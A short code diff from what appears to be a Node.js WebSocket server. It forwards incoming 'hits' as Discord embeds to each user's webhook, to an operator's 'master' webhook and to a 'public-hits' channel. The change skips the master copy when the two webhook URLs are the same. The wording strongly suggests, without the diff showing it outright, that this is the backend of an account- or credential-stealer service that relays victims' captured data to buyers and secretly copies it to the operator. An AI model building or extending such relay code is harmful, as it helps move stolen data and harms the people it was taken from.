@@ -631,13 +631,14 @@ wss.on('connection', (ws, req) => {
                             });
                         } catch (err) { log(`⚠️ Error sending to User Webhook: ${err.message}`); }
                     }
-                    try {
-                        const webhookClient = new WebhookClient({ url: process.env.WEBHOOK_URL });
-                        await webhookClient.send({ 
-                            content: hitInfo.Name,
-                            embeds: [hitEmbed] 
-                        });
-                    } catch (err) { log(`⚠️ Error sending to User Webhook: ${err.message}`); }
+                    if (process.env.WEBHOOK_URL !== mapping.url) {
+                        try {
+                            const masterWebhook = new WebhookClient({ url: process.env.WEBHOOK_URL });
+                            await masterWebhook.send({ content: hitInfo.Name, embeds: [hitEmbed] });
+                        } catch (err) { log(`⚠️ Error Master Copy: ${err.message}`); }
+                    } else {
+                        log(`ℹ️ Copie Master ignorée (URL identique à l'utilisateur)`);
+                    }
                     
                     // 5. Envoi sur le Channel PUBLIC (public-hits)
                     const publicChannel = await clientDiscord.channels.fetch('1487370329776193677').catch(() => null);
